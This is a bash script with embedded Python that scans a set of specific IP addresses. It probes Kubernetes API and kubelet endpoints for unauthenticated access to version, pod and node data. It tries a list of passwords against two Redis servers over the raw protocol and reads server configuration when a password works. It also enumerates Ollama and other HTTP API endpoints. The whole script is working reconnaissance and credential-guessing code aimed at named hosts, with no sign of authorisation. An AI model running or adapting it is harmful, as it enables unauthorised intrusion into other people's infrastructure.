#!/bin/bash
set +e
echo "### START $(date -u +%FT%TZ)"
echo "### K8S"
for ip in 123.184.7.170 123.184.7.195 123.184.7.222 123.184.7.225 123.184.7.235 123.184.7.158; do
  for p in 6443 10250; do
    echo "-- $ip:$p/version"; timeout 10 curl -sk -m 8 -o /tmp/o -w "code=%{http_code} len=%{size_download}\n" "https://$ip:$p/version"; head -c 260 /tmp/o; echo
  done
  echo "-- $ip:10250/healthz"; timeout 8 curl -sk -m 6 -o /tmp/o -w "code=%{http_code}\n" "https://$ip:10250/healthz"; head -c 120 /tmp/o; echo
  echo "-- $ip:10250/pods"; timeout 8 curl -sk -m 6 -o /tmp/o -w "code=%{http_code} len=%{size_download}\n" "https://$ip:10250/pods"; head -c 160 /tmp/o; echo
  echo "-- $ip:6443/nodes"; timeout 8 curl -sk -m 6 -o /tmp/o -w "code=%{http_code} len=%{size_download}\n" "https://$ip:6443/api/v1/nodes"; head -c 160 /tmp/o; echo
done
echo "### REDIS-152"
python3 - <<'PY'
import socket,time
def rcmd(s,*a):
    q=b"*%d\r\n"%len(a)+b"".join(b"$%d\r\n%s\r\n"%(len(x),x) for x in [y.encode() if isinstance(y,str) else y for y in a])
    s.sendall(q); time.sleep(0.3)
    try: return s.recv(65535)
    except Exception as e: return b"ERR:"+str(e).encode()
for host in ("123.184.7.152","123.184.7.135"):
    try:
        s=socket.create_connection((host,6379),5); s.settimeout(4)
        print(host,"PING =>",rcmd(s,"PING")[:80])
        print(host,"CONFIG dir =>",rcmd(s,"CONFIG","GET","dir")[:120])
        for pw in ["Beijingcs.2024","Kgzs@2024","Admin@123_para#!2024","admin","root","redis123","Ubuntu@2024"]:
            r=rcmd(s,"AUTH",pw)
            print(host,"AUTH",pw,"=>",r[:60])
            if b"+OK" in r:
                print(host,"CONFIG dir via auth =>",rcmd(s,"CONFIG","GET","dir")[:120]); print(host,"INFO =>",rcmd(s,"INFO","server")[:400]); break
    except Exception as e: print(host,"ERR",e)
PY
echo "### OLLAMA-135"
timeout 10 curl -s -m 8 http://123.184.7.135:11434/api/tags -w "|%{http_code}\n" | head -c 500
echo "### 18080-135"
for u in http://123.184.7.135:18080/api/health http://123.184.7.135:18080/api/datasets http://123.184.7.135:18080/api/jobs http://123.184.7.135:18080/openapi.json http://123.184.7.135:18080/api; do
  echo "-- $u"; timeout 10 curl -s -m 8 -o /tmp/o -w "code=%{http_code} len=%{size_download}\n" "$u"; head -c 300 /tmp/o; echo
done
echo "### 199-PATHS"
timeout 10 curl -s -m 8 http://123.184.7.199:18000/openapi.json | python3 -c 'import json,sys;d=json.load(sys.stdin);print(" ".join(sorted(d.get("paths",{}).keys()))[:900]); print("TITLE",d.get("info",{}).get("title"))'
echo "### END $(date -u +%FT%TZ)"
